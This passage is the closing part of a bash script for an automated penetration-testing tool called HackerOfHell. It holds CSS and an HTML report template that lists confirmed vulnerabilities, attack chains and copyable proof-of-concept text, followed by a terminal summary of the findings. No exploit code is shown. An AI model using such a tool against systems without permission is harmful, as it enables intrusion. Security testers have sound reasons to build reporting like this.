  padding:3px 10px;border:1px solid;letter-spacing:.1em;flex-shrink:0}}
.cv{{font-family:'Share Tech Mono',monospace;font-size:.6rem;color:var(--m);
  background:var(--bg);border:1px solid var(--b);padding:3px 8px;flex-shrink:0}}
.fn{{font-size:.88rem;font-weight:700}}
.tt{{font-family:'Share Tech Mono',monospace;font-size:.58rem;color:var(--a);
  background:rgba(0,212,255,.08);border:1px solid rgba(0,212,255,.15);padding:2px 8px;flex-shrink:0}}
.ch{{color:var(--m);font-size:.65rem;transition:transform .2s;flex-shrink:0}}
.fb{{padding:18px;border-top:1px solid var(--b);background:var(--bg)}}
.dg{{display:grid;grid-template-columns:1fr 1fr;gap:18px}}
.ds{{margin-bottom:14px}}
.dl{{font-family:'Share Tech Mono',monospace;font-size:.58rem;letter-spacing:.15em;
  color:var(--m);margin-bottom:6px;text-transform:uppercase}}
.dv{{font-size:.82rem;color:var(--t);line-height:1.5}}
.url{{font-family:'Share Tech Mono',monospace;font-size:.72rem;color:var(--a);word-break:break-all}}
.ev{{font-family:'Share Tech Mono',monospace;font-size:.7rem;background:var(--s);
  border:1px solid var(--b);border-left:3px solid var(--me);padding:10px;
  color:#7ee787;word-break:break-all}}
.rm{{color:#79c0ff;font-size:.8rem;line-height:1.6}}
.poc{{background:#010409;border:1px solid var(--b);border-left:3px solid var(--cr);
  padding:12px;font-family:'Share Tech Mono',monospace;font-size:.7rem;
  color:#7ee787;white-space:pre;overflow-x:auto;line-height:1.8}}
.cpb{{margin-top:8px;font-family:'Share Tech Mono',monospace;font-size:.6rem;
  color:var(--m);background:transparent;border:1px solid var(--b);padding:4px 10px;
  cursor:pointer;transition:all .15s}}
.cpb:hover{{color:var(--a);border-color:var(--a)}}
/* FOOTER */
.ft{{margin-top:50px;padding:20px;border:1px solid var(--b);background:var(--s);
  font-family:'Share Tech Mono',monospace;font-size:.68rem;color:var(--m)}}
.ft-logo{{font-family:'Orbitron',monospace;font-size:.8rem;font-weight:700;
  color:var(--a);margin-bottom:8px}}
::-webkit-scrollbar{{width:4px}}::-webkit-scrollbar-track{{background:var(--bg)}}
::-webkit-scrollbar-thumb{{background:var(--b)}}
@media(max-width:900px){{.rh,.sg,.dg{{grid-template-columns:1fr}}}}
</style></head><body>
<div class="page">
<div class="rh">
  <div>
    <div class="ascii">
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗ ███████╗
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝
    ███████║███████║██║     █████╔╝ █████╗  ██████╔╝██║   ██║███████╗
    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║╚════██║
    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║╚██████╔╝███████║
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                     O F   H E L L   —   PENTEST REPORT
    </div>
    <div class="rt">PENETRATION TEST REPORT</div>
    <div class="rm2">
      TARGET: <span>{target}</span> &nbsp;|&nbsp;
      DATE: <span>{date_str}</span> &nbsp;|&nbsp;
      MODE: <span>{mode}</span><br>
      AUTHOR: <span>{author}</span> &nbsp;|&nbsp;
      HANDLE: <span>{handle}</span> &nbsp;|&nbsp;
      CLASSIFICATION: <span>CONFIDENTIAL</span>
    </div>
  </div>
  <div class="risk">
    <div class="rn">{risk_score}</div>
    <div class="rl">Risk Score</div>
  </div>
</div>

<div class="sg">
  <div class="sc2">
    <div class="ct">Findings by Severity</div>
    {sev_bars}
  </div>
  <div class="sc2">
    <div class="ct">Statistics</div>
    <div class="stg">
      <div class="si"><div class="sn">{total}</div><div class="slb">Total</div></div>
      <div class="si"><div class="sn" style="color:var(--cr)">{sev_counts.get('CRITICAL',0)}</div><div class="slb">Critical</div></div>
      <div class="si"><div class="sn" style="color:var(--hi)">{sev_counts.get('HIGH',0)}</div><div class="slb">High</div></div>
      <div class="si"><div class="sn" style="color:var(--me)">{sev_counts.get('MEDIUM',0)}</div><div class="slb">Medium</div></div>
      <div class="si"><div class="sn" style="color:var(--lo)">{sev_counts.get('LOW',0)}</div><div class="slb">Low</div></div>
      <div class="si"><div class="sn" style="color:var(--a4)">{len(chains)}</div><div class="slb">Chains</div></div>
    </div>
  </div>
  <div class="sc2">
    <div class="ct">About This Report</div>
    <div style="font-size:.78rem;color:var(--m);line-height:2;font-family:'Share Tech Mono',monospace">
      Tool: HackerOfHell v3.0<br>
      Author: {author}<br>
      Handle: {handle}<br>
      Method: Automated + Verified<br>
      Phases: 7 (Recon→Report)<br>
      Only confirmed bugs shown
    </div>
  </div>
</div>

{"<div class='chains'><div class='ftitle'>⛓ VULNERABILITY CHAINS — COMBINED IMPACT</div>" + chains_html + "</div>" if chains else ""}

<div class="ftitle">CONFIRMED VULNERABILITY FINDINGS — SEVERITY SORTED</div>
{findings_html if findings_html else '<div style="color:var(--m);font-family:Share Tech Mono,monospace;font-size:.85rem;padding:40px;text-align:center;border:1px solid var(--b)">No confirmed vulnerabilities found. Target appears well-hardened.</div>'}

<div class="ft">
  <div class="ft-logo">⚡ HACKEROFHELL — AUTOMATED PENTEST REPORT</div>
  <div>Generated by HackerOfHell v3.0 | Author: {author} | Handle: {handle}</div>
  <div>Target: {target} | Date: {date_str} | CONFIDENTIAL — FOR AUTHORIZED USE ONLY</div>
  <div style="margin-top:8px;color:var(--b)">Only use on systems you own or have explicit written permission to test.</div>
</div>

</div>
<script>
const pocs = {json.dumps([f.get('poc','') for f in findings])};
function tog(id){{
  const n=id.replace('f','');
  const b=document.getElementById('fb'+n);
  const c=document.getElementById('ch'+n);
  if(b.style.display==='none'){{b.style.display='block';c.style.transform='rotate(180deg)'}}
  else{{b.style.display='none';c.style.transform=''}}
}}
function cp(i){{
  navigator.clipboard.writeText(pocs[i]||'').catch(()=>{{}});
  event.target.textContent='✓ COPIED';
  setTimeout(()=>event.target.textContent='⎘ COPY PoC',2000);
}}
</script>
</body></html>"""

report_path = os.path.expandvars('$REPORT_PATH')
with open(report_path, 'w') as f:
    f.write(html)
print(report_path)
PYEOF

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FINAL SUMMARY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TOTAL_F=$(python3 -c "import json; d=json.load(open('$FINDINGS')); print(len(d['findings']))" 2>/dev/null || echo 0)
CRIT_F=$(python3 -c "import json; d=json.load(open('$FINDINGS')); print(sum(1 for f in d['findings'] if f.get('severity')=='CRITICAL'))" 2>/dev/null || echo 0)
HIGH_F=$(python3 -c "import json; d=json.load(open('$FINDINGS')); print(sum(1 for f in d['findings'] if f.get('severity')=='HIGH'))" 2>/dev/null || echo 0)

echo ""
echo -e "${R}${BOLD}"
cat << 'ENDBANNER'
  ╔══════════════════════════════════════════════════════════════╗
  ║              HACKEROFHELL — SCAN COMPLETE                    ║
  ╚══════════════════════════════════════════════════════════════╝
ENDBANNER
echo -e "${NC}"
echo -e "  ${M}Author  :${NC} ${W}RAJESH BAJIYA${NC}  ${M}|${NC}  ${R}${BOLD}HACKEROFHELL${NC}"
echo -e "  ${M}Target  :${NC} ${G}${BOLD}$TARGET${NC}"
echo -e "  ${Y}Findings:${NC} ${BOLD}$TOTAL_F confirmed vulnerabilities${NC}"
echo -e "  ${R}Critical:${NC} ${BOLD}$CRIT_F${NC}"
echo -e "  ${Y}High    :${NC} ${BOLD}$HIGH_F${NC}"
echo -e "  ${C}Report  :${NC} ${BOLD}$REPORT_PATH${NC}"
echo -e "  ${C}Output  :${NC} ${BOLD}$OUTDIR${NC}"
echo ""
echo -e "  ${G}firefox $REPORT_PATH${NC}"
echo ""

notify "Scan COMPLETE — $TOTAL_F findings ($CRIT_F critical) on $TARGET"
